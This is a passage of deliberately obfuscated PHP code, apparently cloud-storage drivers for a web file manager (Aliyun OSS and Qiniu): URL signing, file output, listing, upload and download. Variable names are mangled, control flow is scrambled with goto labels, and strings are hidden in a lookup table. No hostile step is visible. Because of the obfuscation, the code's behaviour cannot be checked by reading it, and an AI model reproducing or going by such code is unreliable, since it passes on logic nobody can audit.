$aîˆ¬·ˆÍ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($EÑì†ÓÍ‚ˆ); goto C´²Ä˜î´Æ; C´²Ä˜î´Æ: return $aîˆ¬·ˆÍ; goto fÑ‘‹Îñ; fÑ‘‹Îñ: } public function link($Dªæ†„ŒŒì, $e‰ÔùÛ®Ï = array()) { $Añ¶Ã–…× =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->exist($Dªæ†„ŒŒì) || $this->isFolder($Dªæ†„ŒŒì)) { return !1; } try { $e‰ÔùÛ®Ï = $this->trafficLimit($Añ¶Ã–…×[115], $e‰ÔùÛ®Ï); $EÀº‡Ê¹‚– = $this->client->signUrl($this->bucket, $this->pathEncode($Dªæ†„ŒŒì), 3600 * 12, $Añ¶Ã–…×[226], $e‰ÔùÛ®Ï); return $this->getCdnLink($EÀº‡Ê¹‚–); } catch (OSS\Core\OssException $e‹ŠÉ­ëÆ•) { return !1; } } public function fileOut($F¯Ÿ§äåğš, $Eœ‰ëÍÓ = false, $cê¤íò³»— = false, $AŠ„ˆÁ¶¡ = '') { goto b®¸Ï‰†Åé; F’®¡Ÿ­†: $cê¤íò³»— = rawurlencode($cê¤íò³»—); $aÉÑµ˜šÇö = get_file_mime(get_path_ext($cê¤íò³»—)); if ($aÉÑµ˜šÇö == $EŒ¹©·ä¤[211]) { return parent::fileOut($F¯Ÿ§äåğš, $Eœ‰ëÍÓ, $cê¤íò³»—, $AŠ„ˆÁ¶¡); } goto A¬ÍàÄ¯ô—; A¬ÍàÄ¯ô—: $Eœ‰ëÍÓ = $Eœ‰ëÍÓ ? $EŒ¹©·ä¤[212] : $EŒ¹©·ä¤[213]; $C™ÙœàöÊØ = array(OSS\OssClient::OSS_SUB_RESOURCE => $EŒ¹©·ä¤[1216] . rawurlencode("{$Eœ‰ëÍÓ}\73\x66\x69\154\x65\156\141\155\145\75{$cê¤íò³»—}")); $C™ÙœàöÊØ[OSS\OssClient::OSS_SUB_RESOURCE] .= $EŒ¹©·ä¤[1217] . rawurlencode($aÉÑµ˜šÇö); goto eÚ×¡†‡; b®¸Ï‰†Åé: $EŒ¹©·ä¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->isFileOutServer()) { return $this->fileOutServer($F¯Ÿ§äåğš, $Eœ‰ëÍÓ, $cê¤íò³»—, $AŠ„ˆÁ¶¡); } if (!$cê¤íò³»—) { $cê¤íò³»— = $this->pathThis($F¯Ÿ§äåğš); } goto F’®¡Ÿ­†; eÚ×¡†‡: $d‰È¹êˆÇ¯ = $this->link($F¯Ÿ§äåğš, $C™ÙœàöÊØ); $this->fileOutLink($d‰È¹êˆÇ¯); goto dğÃêàµ²×; dğÃêàµ²×: } public function fileOutServer($a§”õë¸©º, $d×„òº„äÌ = false, $bƒİ§…‘î = false, $eÂ£ğì±Ãù = '') { parent::fileOut($a§”õë¸©º, $d×„òº„äÌ, $bƒİ§…‘î, $eÂ£ğì±Ãù); } public function fileOutImage($fÇºØÑâ×¼, $FÇÑ£Äº = 250) { $eÍ‹°î»ç“ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[çŞáÓæÚô‚Ô‡][1218] . $FÇÑ£Äº); $bŒô æ««ö = $this->link($fÇºØÑâ×¼, $eÍ‹°î»ç“); $this->fileOutLink($bŒô æ««ö); } public function fileOutImageServer($e£ÙÍµÆÉÁ, $D…Êïˆ²±Ô = 250) { parent::fileOutImage($e£ÙÍµÆÉÁ, $D…Êïˆ²±Ô); } public function fileOutLink($Eùƒ¡ÛŠ¼¹) { $bá¤‰İß—Ş =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->isCdnHost() && substr($Eùƒ¡ÛŠ¼¹, 0, 7) == $bá¤‰İß—Ş[1122]) { $Eùƒ¡ÛŠ¼¹ = $bá¤‰İß—Ş[1123] . substr($Eùƒ¡ÛŠ¼¹, 7); } header($bá¤‰İß—Ş[166] . $Eùƒ¡ÛŠ¼¹); die; } public function hashMd5($A¨í†÷±Ôã, $EÁİ„ÂŒ = '') { $CÉªµªÄãÓ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÛ­ò²î = $this->objectMeta($A¨í†÷±Ôã); if (!$BÛ­ò²î) { return $CÉªµªÄãÓ[43]; } if (!isset($BÛ­ò²î[$CÉªµªÄãÓ[1191]]) && !empty($EÁİ„ÂŒ)) { $aŒÂŸ¹ê‹ = $this->updateObjMeta($A¨í†÷±Ôã, array($CÉªµªÄãÓ[1191] => $EÁİ„ÂŒ)); $BÛ­ò²î[$CÉªµªÄãÓ[1191]] = $aŒÂŸ¹ê‹ ? $EÁİ„ÂŒ : $CÉªµªÄãÓ[43]; } return isset($BÛ­ò²î[$CÉªµªÄãÓ[1191]]) ? strtolower($BÛ­ò²î[$CÉªµªÄãÓ[1191]]) : $CÉªµªÄãÓ[43]; } public function size($FÙí„ÛÂËï) { $B»±„½†œ = $this->objectMeta($FÙí„ÛÂËï); return $B»±„½†œ ? $B»±„½†œ[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function info($bÒßÓÖÛ¢—) { if ($this->isFolder($bÒßÓÖÛ¢—)) { return $this->folderInfo($bÒßÓÖÛ¢—); } else { if ($this->isFile($bÒßÓÖÛ¢—)) { return $this->fileInfo($bÒßÓÖÛ¢—); } } return !1; } public function exist($bõ›ÇÔÊ†) { return $this->isFile($bõ›ÇÔÊ†) || $this->isFolder($bõ›ÇÔÊ†); } public function isFile($c²ó´›º) { return !$this->isFolder($c²ó´›º) && $this->objectMeta($c²ó´›º); } public function isFolder($d‰§—Ü’ß) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][232], $d‰§—Ü’ß); } protected function objectMeta($DŒƒÕ×ÀÔ¶) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][233], $DŒƒÕ×ÀÔ¶); } protected function _objectMeta($bæ—æ‹àÒ¡) { $b¬ÀŠÔ®éÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; try { $fó¨¡ô†œ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($bæ—æ‹àÒ¡)); } catch (OSS\Core\OssException $f›‚Õ´šõã) { $fó¨¡ô†œ = !1; } if ($fó¨¡ô†œ) { $fó¨¡ô†œ[$b¬ÀŠÔ®éÀ[87]] = intval($fó¨¡ô†œ[$b¬ÀŠÔ®éÀ[1198]]); } return $fó¨¡ô†œ; } protected function _isFolder($eİİÛÛ“¥ó) { $Fğ¦Î«©‹– =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($eİİÛÛ“¥ó == $Fğ¦Î«©‹–[43] || $eİİÛÛ“¥ó == $Fğ¦Î«©‹–[18]) { return !0; } $D†‡ìÄ’ğ = array($Fğ¦Î«©‹–[1188] => $Fğ¦Î«©‹–[18], $Fğ¦Î«©‹–[196] => rtrim($eİİÛÛ“¥ó, $Fğ¦Î«©‹–[18]) . $Fğ¦Î«©‹–[18], $Fğ¦Î«©‹–[1189] => 1, $Fğ¦Î«©‹–[1190] => $Fğ¦Î«©‹–[43]); $Aõ²…¡ÔÓø = $this->client->listObjects($this->bucket, $D†‡ìÄ’ğ); if ($Aõ²…¡ÔÓø->getObjectList() || $Aõ²…¡ÔÓø->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($A¥„ÍŠ‰äÑ) { parent::__construct(); require_once SDK_DIR . $_SERVER[çŞáÓæÚô‚Ô‡][1219]; $this->_init($A¥„ÍŠ‰äÑ); } public function _init($d²·Øƒ£ù‡) { foreach ($d²·Øƒ£ù‡ as $bñ—ïô¦¬ => $dáêóÆ§Œ) { if (isset($this->{$bñ—ïô¦¬})) { $this->{$bñ—ïô¦¬} = $dáêóÆ§Œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[çŞáÓæÚô‚Ô‡][1220], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($dÙ  ¶õñÇ, $a³î†Ì™¿ˆ = '', $BÅ‡ÕâñØ“ = REPEAT_RENAME) { if ($this->setContent($dÙ  ¶õñÇ, $a³î†Ì™¿ˆ)) { return $this->getPathOuter($dÙ  ¶õñÇ); } return !1; } public function mkdir($a±ŒßÏÄ‰, $fî‘ŸÃÊ˜… = REPEAT_SKIP) { goto eòÂÏ³‚ñ½; bî©àîØ: $a±ŒßÏÄ‰ = $fÀ›á«®„‹ . $Fì±µ§å¢‚[18]; $EÑ´‚àõÅÌ = get_path_this($fÀ›á«®„‹); $fµ–·¥óÙ = $a±ŒßÏÄ‰ . $EÑ´‚àõÅÌ; goto aø³Øà³Çæ; aø³Øà³Çæ: if (!$this->mkfile($fµ–·¥óÙ)) { return !1; } if (!$this->moveFile($fµ–·¥óÙ, $a±ŒßÏÄ‰)) { $this->delFile($fµ–·¥óÙ); return !1; } return $this->getPathOuter($fÀ›á«®„‹); goto DÄØñõ„“ß; eòÂÏ³‚ñ½: $Fì±µ§å¢‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÀ›á«®„‹ = trim($a±ŒßÏÄ‰, $Fì±µ§å¢‚[18]); if ($this->_isFolder($fÀ›á«®„‹)) { return $this->getPathOuter($fÀ›á«®„‹); } goto bî©àîØ; DÄØñõ„“ß: } public function copyFile($dĞë¿»‘¡, $Fºàîß‡¦Ñ) { $d®£˜º êå = $this->bucketManager->copy($this->bucket, $dĞë¿»‘¡, $this->bucket, $Fºàîß‡¦Ñ, !0); return $d®£˜º êå ? !1 : $this->getPathOuter($Fºàîß‡¦Ñ); } public function moveFile($e™˜¢ °«³, $añëÚ¹¨Ã•) { $AÜÍãøÈí³ = $this->bucketManager->move($this->bucket, $e™˜¢ °«³, $this->bucket, $añëÚ¹¨Ã•, !0); return $AÜÍãøÈí³ ? !1 : $this->getPathOuter($añëÚ¹¨Ã•); } public function delFile($bÄîà–ÈÓÇ) { $AƒÍ Ğöˆ = $this->bucketManager->delete($this->bucket, $bÄîà–ÈÓÇ); return $AƒÍ Ğöˆ ? !1 : !0; } public function delFolder($cğïêç–‹Œ) { $bÉäÒšÔÒß = $this->fileList($cğïêç–‹Œ); if (empty($bÉäÒšÔÒß)) { return !0; } $bÏäŠâ¬„á = 1000; if (count($bÉäÒšÔÒß) <= $bÏäŠâ¬„á) { return $this->qnDelObj($bÉäÒšÔÒß) ? !1 : !0; } foreach (array_chunk($bÉäÒšÔÒß, $bÏäŠâ¬„á) as $e¾¦ƒÂ¹ñ) { $AÕÌÈòĞ­ = $this->qnDelObj($e¾¦ƒÂ¹ñ); if ($AÕÌÈòĞ­) { return !1; } } return !0; } private function qnDelObj($Dö±¼Ô‡) { $bïğİÌ ÁÆ = $this->bucketManager->buildBatchDelete($this->bucket, $Dö±¼Ô‡); list($AëÂëíå¡, $FêÉƒÁ ×») = $this->bucketManager->batch($bïğİÌ ÁÆ); return $FêÉƒÁ ×»; } private function fileList($Eàä‡Öµ, $FÃõîÚÄ¶® = 0) { goto Aö™ØÎ´¦ä; Aö™ØÎ´¦ä: $bƒ¢îˆ„§Ç =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eàä‡Öµ = trim($Eàä‡Öµ, $bƒ¢îˆ„§Ç[18]); $A¹ñ‚’ø¸Ş = empty($Eàä‡Öµ) ? $bƒ¢îˆ„§Ç[43] : $Eàä‡Öµ . $bƒ¢îˆ„§Ç[18]; goto c†åŞÙéï‘; D£Ä“¿Õ¸: $a•İ’‚å± = array(); while (!0) { list($fÀŸ÷ªÍ×„, $eÊÅºÑ¨Š) = $this->bucketManager->listFiles($this->bucket, $A¹ñ‚’ø¸Ş, $CÃÒ‘ñÔÊõ, $aº‘œ¸êÇÌ, $Aê»ôÁÜí’); if ($eÊÅºÑ¨Š) { return !1; } $CÃÒ‘ñÔÊõ = array_key_exists($bƒ¢îˆ„§Ç[1190], $fÀŸ÷ªÍ×„) ? $CÃÒ‘ñÔÊõ = $fÀŸ÷ªÍ×„[$bƒ¢îˆ„§Ç[1221]] : $bƒ¢îˆ„§Ç[43]; foreach ($fÀŸ÷ªÍ×„[$bƒ¢îˆ„§Ç[1222]] as $eâÛàÖ°Ù«) { $bÁ‡“¿îë = $eâÛàÖ°Ù«[$bƒ¢îˆ„§Ç[99]]; if ($FÃõîÚÄ¶®) { $bÁ‡“¿îë = array($bƒ¢îˆ„§Ç[38] => $bÁ‡“¿îë, $bƒ¢îˆ„§Ç[87] => $eâÛàÖ°Ù«[$bƒ¢îˆ„§Ç[1223]]); } $a•İ’‚å±[] = $bÁ‡“¿îë; } if ($CÃÒ‘ñÔÊõ == $bƒ¢îˆ„§Ç[43]) { break; } } return $a•İ’‚å±; goto DÄŒ‚¥°ä; c†åŞÙéï‘: $CÃÒ‘ñÔÊõ = $bƒ¢îˆ„§Ç[43]; $aº‘œ¸êÇÌ = 1000; $Aê»ôÁÜí’ = $bƒ¢îˆ„§Ç[43]; goto D£Ä“¿Õ¸; DÄŒ‚¥°ä: } public function rename($AÉ…ÉØŠœ¥, $C­ÑÁÉÂœ…) { return $this->renameObject($AÉ…ÉØŠœ¥, $C­ÑÁÉÂœ…); } public function fileInfo($D¡Îö¿áøà, $aëøĞ´´Ğê = false, $BçÇŠ¬•à = array()) { goto bŞÇ™šğ‚ ; bŞÇ™šğ‚ : $AÚÑ±¸ãğ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($aëøĞ´´Ğê) { return array($AÚÑ±¸ãğ¥[38] => $this->pathThis($D¡Îö¿áøà), $AÚÑ±¸ãğ¥[85] => $this->getPathOuter($AÚÑ±¸ãğ¥[18] . $D¡Îö¿áøà), $AÚÑ±¸ãğ¥[39] => $AÚÑ±¸ãğ¥[177], $AÚÑ±¸ãğ¥[87] => isset($BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1223]]) ? $BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1223]] : 0, $AÚÑ±¸ãğ¥[170] => $this->ext($D¡Îö¿áøà)); } $E’øğ¨˜ª = array($AÚÑ±¸ãğ¥[38] => $this->pathThis($D¡Îö¿áøà), $AÚÑ±¸ãğ¥[85] => $this->getPathOuter($AÚÑ±¸ãğ¥[18] . $D¡Îö¿áøà), $AÚÑ±¸ãğ¥[39] => $AÚÑ±¸ãğ¥[177], $AÚÑ±¸ãğ¥[197] => 0, $AÚÑ±¸ãğ¥[117] => 0, $AÚÑ±¸ãğ¥[87] => 0, $AÚÑ±¸ãğ¥[170] => $this->ext($D¡Îö¿áøà), $AÚÑ±¸ãğ¥[198] => !0, $AÚÑ±¸ãğ¥[199] => !0); goto AÛ™Æì½‘Ü; AÑ†³Ñ±Ô: return $E’øğ¨˜ª; goto cŒ×Æ¦öÇ; AÛ™Æì½‘Ü: if (empty($BçÇŠ¬•à)) { $BçÇŠ¬•à = $this->objectMeta($D¡Îö¿áøà); if (!$BçÇŠ¬•à) { return $E’øğ¨˜ª; } } if (isset($BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1224]])) { $E’øğ¨˜ª[$AÚÑ±¸ãğ¥[117]] = substr($BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1224]] . $AÚÑ±¸ãğ¥[43], 0, 10); } if (isset($BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1223]])) { $E’øğ¨˜ª[$AÚÑ±¸ãğ¥[87]] = $BçÇŠ¬•à[$AÚÑ±¸ãğ¥[1223]]; } goto AÑ†³Ñ±Ô; cŒ×Æ¦öÇ: } public function folderInfo($Fˆ¥¯íÌ, $AÅÆÅº¸æ‡ = false) { goto E¯±õ£¶Å¸; E¯±õ£¶Å¸: $EÍ Å ß… =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($AÅÆÅº¸æ‡) { return array($EÍ Å ß…[38] => $this->pathThis($Fˆ¥¯íÌ), $EÍ Å ß…[85] => $this->getPathOuter($EÍ Å ß…[18] . $Fˆ¥¯íÌ), $EÍ Å ß…[39] => $EÍ Å ß…[86]); } $b‹¬«—õ²Ä = array($EÍ Å ß…[38] => $this->pathThis($Fˆ¥¯íÌ), $EÍ Å ß…[85] => $this->getPathOuter($EÍ Å ß…[18] . $Fˆ¥¯íÌ), $EÍ Å ß…[39] => $EÍ Å ß…[86], $EÍ Å ß…[197] => 0, $EÍ Å ß…[117] => 0, $EÍ Å ß…[1169] => !0, $EÍ Å ß…[1170] => !0); goto F‘“œÑ™; F‘“œÑ™: $Fˆ¥¯íÌ = rtrim($Fˆ¥¯íÌ, $EÍ Å ß…[18]) . $EÍ Å ß…[18]; $aÂ©Åò­©ƒ = $this->objectMeta($Fˆ¥¯íÌ); if (isset($aÂ©Åò­©ƒ[$EÍ Å ß…[1224]])) { $b‹¬«—õ²Ä[$EÍ Å ß…[117]] = substr($aÂ©Åò­©ƒ[$EÍ Å ß…[1224]] . $EÍ Å ß…[43], 0, 10); } goto d‚²ø–ˆ©; d‚²ø–ˆ©: return $b‹¬«—õ²Ä; goto B´Ò’æ§ã¡; B´Ò’æ§ã¡: } public function listPath($BğÎŠôƒ¦ã, $cĞâÑìºæ© = false) { goto d£à‰Æ¹æ; FÕ‘‚¸çå: $fÔ²ë¹ = $A…ñƒí·‰ã[43]; $A™º‹¥“ßÈ = 1000; $C÷ìí„‡áÀ = $A…ñƒí·‰ã[18]; goto CÕ»¢øßÉæ; d£à‰Æ¹æ: $A…ñƒí·‰ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BğÎŠôƒ¦ã = trim($BğÎŠôƒ¦ã, $A…ñƒí·‰ã[18]); $eŠìŸ¸‹“Ü = empty($BğÎŠôƒ¦ã) ? $A…ñƒí·‰ã[43] : $BğÎŠôƒ¦ã . $A…ñƒí·‰ã[18]; goto FÕ‘‚¸çå; CÕ»¢øßÉæ: $A´­ƒ†Ğá… = $eöêğóÛÖä = array(); while (!0) { list($a‚™”„¤Şò, $Cò¹¨•È†Ú) = $this->bucketManager->listFiles($this->bucket, $eŠìŸ¸‹“Ü, $fÔ²ë¹, $A™º‹¥“ßÈ, $C÷ìí„‡áÀ); if ($Cò¹¨•È†Ú) { return !1; } $fÔ²ë¹ = array_key_exists($A…ñƒí·‰ã[1190], $a‚™”„¤Şò) ? $fÔ²ë¹ = $a‚™”„¤Şò[$A…ñƒí·‰ã[1221]] : $A…ñƒí·‰ã[43]; if (isset($a‚™”„¤Şò[$A…ñƒí·‰ã[1225]])) { foreach ($a‚™”„¤Şò[$A…ñƒí·‰ã[1225]] as $a–œœ²·´) { if ($a–œœ²·´ == $eŠìŸ¸‹“Ü) { continue; } $A´­ƒ†Ğá…[] = $this->folderInfo($a–œœ²·´, $cĞâÑìºæ©); } } if (isset($a‚™”„¤Şò[$A…ñƒí·‰ã[1222]])) { foreach ($a‚™”„¤Şò[$A…ñƒí·‰ã[1222]] as $AÓ‰Ò·¹ğ) { if ($AÓ‰Ò·¹ğ[$A…ñƒí·‰ã[99]] == $eŠìŸ¸‹“Ü) { continue; } $eöêğóÛÖä[] = $this->fileInfo($AÓ‰Ò·¹ğ[$A…ñƒí·‰ã[99]], $cĞâÑìºæ©, $AÓ‰Ò·¹ğ); } } if ($fÔ²ë¹ == $A…ñƒí·‰ã[43]) { break; } } return array($A…ñƒí·‰ã[84] => $A´­ƒ†Ğá…, $A…ñƒí·‰ã[83] => $eöêğóÛÖä); goto F‰ÆÍµŸØ; F‰ÆÍµŸØ: } public function has($aŠøäÊ±¤ä, $f³æ³Ú®Í = false, $a‹òÙ”±ø¦ = true) { goto f¨Ä¿Ë¨Ø; B§’ƒì±×: $bÇë·êß = 0; $F³´ëŒÙ‘Ÿ = 0; while (!0) { list($Eˆ—’Ì™Å›, $Aì“˜÷ìˆ´) = $this->bucketManager->listFiles($this->bucket, $CôËŞØ²òí, $DªßÔ­ó‹¿, $aˆéáƒ®¨, $BÒá§¼§); if ($Aì“˜÷ìˆ´) { return !1; } $DªßÔ­ó‹¿ = array_key_exists($bÛå»Ú’÷Æ[1190], $Eˆ—’Ì™Å›) ? $DªßÔ­ó‹¿ = $Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1221]] : $bÛå»Ú’÷Æ[43]; if ($f³æ³Ú®Í) { if (!empty($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1222]])) { $bÇë·êß += count($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1222]]); } if (!empty($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1225]])) { $F³´ëŒÙ‘Ÿ += count($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1225]]); } if ($DªßÔ­ó‹¿ === $bÛå»Ú’÷Æ[43]) { break; } continue; } if ($a‹òÙ”±ø¦) { if (!empty($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1222]])) { return !0; } } else { if (!empty($Eˆ—’Ì™Å›[$bÛå»Ú’÷Æ[1225]])) { return !0; } } if ($DªßÔ­ó‹¿ == $bÛå»Ú’÷Æ[43]) { break; } } goto fäàÎË’ˆÜ; fäàÎË’ˆÜ: if ($f³æ³Ú®Í) { return array($bÛå»Ú’÷Æ[201] => $bÇë·êß, $bÛå»Ú’÷Æ[202] => $F³´ëŒÙ‘Ÿ); } return !1; goto eÛêóÇ„ô; f¨Ä¿Ë¨Ø: $bÛå»Ú’÷Æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aŠøäÊ±¤ä = trim($aŠøäÊ±¤ä, $bÛå»Ú’÷Æ[18]); $CôËŞØ²òí = empty($aŠøäÊ±¤ä) ? $bÛå»Ú’÷Æ[43] : $aŠøäÊ±¤ä . $bÛå»Ú’÷Æ[18]; goto Fäã«ŸØÈÑ; Fäã«ŸØÈÑ: $DªßÔ­ó‹¿ = $bÛå»Ú’÷Æ[43]; $aˆéáƒ®¨ = 1000; $BÒá§¼§ = $bÛå»Ú’÷Æ[18]; goto B§’ƒì±×; eÛêóÇ„ô: } public function listAll($d†ğŠÆÈÖ) { $eÚëª÷‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B¯ÃÜéÈó› = $this->fileList($d†ğŠÆÈÖ, 1); $eŒöØ‰ªÙ = array(); foreach ($B¯ÃÜéÈó› as $cµÛƒÎÄñ) { $eŒöØ‰ªÙ[$cµÛƒÎÄñ[$eÚëª÷‚[38]]] = $cµÛƒÎÄñ[$eÚëª÷‚[87]]; } return $this->listAllFiles($d†ğŠÆÈÖ, array_keys($eŒöØ‰ªÙ), $eŒöØ‰ªÙ); } public function canRead($D§Ÿõ±ÛÈ) { return $this->exist($D§Ÿõ±ÛÈ) ? !0 : !1; } public function canWrite($FÉñÇ¥èŒ) { return $this->exist($FÉñÇ¥èŒ) ? !0 : !1; } public function getContent($Dğä®©³¯·) { return $this->fileSubstr($Dğä®©³¯·, 0, -1); } public function setContent($fğÍïÃÕ, $fª×Óù²æœ = '') { $Bğªáìîà = $this->tempFile($this->pathThis($fğÍïÃÕ)); file_put_contents($Bğªáìîà, $fª×Óù²æœ); if ($this->upload($fğÍïÃÕ, $Bğªáìîà)) { $this->tempFileRemve($Bğªáìîà); return !0; } return !1; } public function refreshUrls($e“†ÈÖäÚÍ) { goto eÛÔÇƒ¹ ; c—“¦ËÔÜŠ: return $Aš³ªî‘[$F…®‡ñ“®‚[1226]] == $F…®‡ñ“®‚[705] ? !0 : !1; goto A§‚Šº¨–; eÛÔÇƒ¹ : $F…®‡ñ“®‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fê†çèÛ´À = array(); if (is_array($e“†ÈÖäÚÍ)) { foreach ($e“†ÈÖäÚÍ as $c×ÒëÄ¬Ñ¤) { $fê†çèÛ´À[] = $this->link($c×ÒëÄ¬Ñ¤); } } else { $fê†çèÛ´À[] = $this->link($e“†ÈÖäÚÍ); } goto FœåÁšô; FœåÁšô: $aÔËÏÊà½ = new Qiniu\Cdn\CdnManager($this->auth); list($Aš³ªî‘, $eŞŠñ‘Â©®) = $aÔËÏÊà½->refreshUrls($fê†çèÛ´À); if ($eŞŠñ‘Â©®) { return !1; } goto c—“¦ËÔÜŠ; A§‚Šº¨–: } public function fileSubstr($e¬øºË³×å, $DŒ¥•Å’³¯, $E§œ¤¨ƒÔ) { $A•ñŞŒÆóï =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!($Bò…œˆ Ïù = $this->link($e¬øºË³×å))) { return !1; } $eª¡ŠÊ–Ö¬ = !1; if ($E§œ¤¨ƒÔ > 0) { $B†Ş®è¨¸× = $DŒ¥•Å’³¯ + $E§œ¤¨ƒÔ - 1; $eª¡ŠÊ–Ö¬ = array($A•ñŞŒÆóï[1227] . $DŒ¥•Å’³¯ . $A•ñŞŒÆóï[421] . $B†Ş®è¨¸×); } $DÄƒè÷ä‰… = url_request($Bò…œˆ Ïù, $A•ñŞŒÆóï[226], !1, $eª¡ŠÊ–Ö¬); return $DÄƒè÷ä‰…[$A•ñŞŒÆóï[698]] ? $DÄƒè÷ä‰…[$A•ñŞŒÆóï[1041]] : !1; } public function upload($DÈˆøÈÄá, $F¦Åª‹¸É¼, $DÂîàéÙÙÖ = false, $d¨š±Íš¾ğ = REPEAT_REPLACE) { $E†à¤Õ”ª = new Qiniu\Storage\UploadManager(); $B”ÓØ“…É° = $this->auth->uploadToken($this->bucket, $DÈˆøÈÄá); $C¯àËŒØàÙ = get_file_mime(get_path_ext($F¦Åª‹¸É¼)); list($F½›Ğ—“ÜÁ, $D¿‘Ó¨†ïˆ) = $E†à¤Õ”ª->putFile($B”ÓØ“…É°, $DÈˆøÈÄá, $F¦Åª‹¸É¼, null, $C¯àËŒØàÙ); return $D¿‘Ó¨†ïˆ ? !1 : $this->getPathOuter($DÈˆøÈÄá); } public function uploadFormData($f˜”¬Ï ğ, $BçÉé›Õ = 3600) { return $this->uploadToken($f˜”¬Ï ğ, $BçÉé›Õ); } public function multiUploadFormData($e×´¼îåËŒ, $b‚ÄÙ×Âíƒ = 3600) { return $this->uploadToken($e×´¼îåËŒ, $b‚ÄÙ×Âíƒ); } private function uploadToken($D‹àî¹…­Ë, $d®ôîŠ§Ñ = 3600) { goto BãµÅë‚¶â; BŞÓÑÛÔ‰ó: $E±‹‡å‹ª = http_type() . "\x3a\57\x2f\165\160\x6c\157\141\144{$CŠ‘õ‘½âù}\56\161\x69\x6e\151\165\160\x2e\x63\x6f\155\x2f"; return array($cò«¦íÔà¼[1231] => $bõ©÷éé«é, $cò«¦íÔà¼[1232] => $E±‹‡å‹ª); goto Bª˜ãñ•´ˆ; EÚ³éà•Æ•: $aÒøªÙ ”à = $D‹àî¹…­Ë; $bõ©÷éé«é = $this->auth->uploadToken($this->bucket, $aÒøªÙ ”à, $dª‡İçÅå, $b„¡ô“õ„˜, !0); $CŠ‘õ‘½âù = empty($this->region) || $this->region == $cò«¦íÔà¼[1230] ? $cò«¦íÔà¼[43] : $cò«¦íÔà¼[421] . $this->region; goto BŞÓÑÛÔ‰ó; BãµÅë‚¶â: $cò«¦íÔà¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dª‡İçÅå = $d®ôîŠ§Ñ; $b„¡ô“õ„˜ = array($cò«¦íÔà¼[1228] => $cò«¦íÔà¼[1229]); goto EÚ³éà•Æ•; Bª˜ãñ•´ˆ: } public function download($eÍ‰™¢àÄ›, $FÊÂ²âÃ„Ğ) { goto eÉ‹®ñ–Ò†; eÉ‹®ñ–Ò†: $cÑ‡™‘²³â = IO::getPathInner(IO::mkfile($FÊÂ²âÃ„Ğ)); if (!($aÚŞøöÔĞ• = $this->link($eÍ‰™¢àÄ›))) { return !1; } $C¹×’Ã½ÒÀ = 0; goto B„ÅÃİ©Êå; B„ÅÃİ©Êå: $FÎºóÙÆö = 1024 * 200; $eË¼øİ²› = fopen($cÑ‡™‘²³â, $_SERVER[çŞáÓæÚô‚Ô‡][1233]); while (!0) { $Dµ §‡ÚÛ‹ = $this->fileSubstr($eÍ‰™¢àÄ›, $C¹×’Ã½ÒÀ, $FÎºóÙÆö); if ($Dµ §‡ÚÛ‹ === !1) { return !1; } fwrite($eË¼øİ²›, $Dµ §‡ÚÛ‹); $C¹×’Ã½ÒÀ += $FÎºóÙÆö; if (strlen($Dµ §‡ÚÛ‹) < $FÎºóÙÆö) { break; } } goto fÊó«Î©·¿; fÊó«Î©·¿: fclose($eË¼øİ²›); return $FÊÂ²âÃ„Ğ; goto FœªŒµÛ…; FœªŒµÛ…: } public function link($e¯×öÃ³¹Û, $BÀß˜Š×Ğ = '') { if (!$this->isFile($e¯×öÃ³¹Û)) { return !1; } $E’Êôº†â = $this->getHost() . $_SERVER[çŞáÓæÚô‚Ô‡][18] . $this->pathEncode($e¯×öÃ³¹Û) . $BÀß˜Š×Ğ; return $this->auth->privateDownloadUrl($E’Êôº†â, 3600 * 12); } public function fileOut($FÙ„®Ú–Ù³, $a÷ó®™óÍß = false, $E¹¸ªäÕÄ… = false, $b·ñ‹ŞìÒ = '') { $eóíÂ“¤Ôœ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->isFileOutServer()) { return $this->fileOutServer($FÙ„®Ú–Ù³, $a÷ó®™óÍß, $E¹¸ªäÕÄ…, $b·ñ‹ŞìÒ); } if (!$E¹¸ªäÕÄ…) { $E¹¸ªäÕÄ… = $this->pathThis($FÙ„®Ú–Ù³); } 